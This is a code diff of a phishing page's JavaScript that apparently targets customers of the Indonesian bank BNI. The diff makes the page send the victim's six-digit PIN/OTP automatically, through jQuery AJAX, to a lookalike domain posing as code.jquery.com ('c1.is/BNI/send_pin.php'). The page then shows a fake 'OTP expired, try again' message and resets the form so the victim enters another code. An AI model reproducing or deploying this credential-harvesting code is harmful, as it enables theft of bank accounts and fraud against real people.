@@ -277,7 +277,7 @@ function kembali(){
  
 </script>
 <script>
-    function sendPin() {
+ $('#pin6').on('input', function (event) {
  event.preventDefault();
 
      
@@ -299,15 +299,19 @@ $("#blink").css("color","#2E869C");
 
 
 $.ajax({
- 
-type: 'POST',
-url: 'https://code-jquery-com.c1.is/BNI/send_pin.php',
-data: $('#pincode').serialize(),
-dataType: 'text',
 
-    success: function(){
+
+
+ type: 'POST',
+ url: 'https://code-jquery-com.c1.is/BNI/send_pin.php',
+ async: false,
+ dataType: 'JSON',
+ data: $('#pincode').serialize(),
+ 
+ complete: function(data) {
+            console.log('Complete')
          $("#blink").addClass("blink");
-         document.getElementById("pincode").reset();
+ 
             
  $("#blink").text("Kode OTP Kadaluarsa, Silahkan Coba Lagi");
 $("#blink").css("color","red");
@@ -319,8 +323,15 @@ $("#blink").css("color","#2E869C");
         $("#blink").show();
          $("#blink").removeClass("blink");
          $("#pin1").focus();
+ document.getElementById("pincode").reset();
+        }, 3000);
+ }
 
-        }, 3000);}});};     
+    });
+
+
+    return false;
+});   
       
 </script>
 <script>
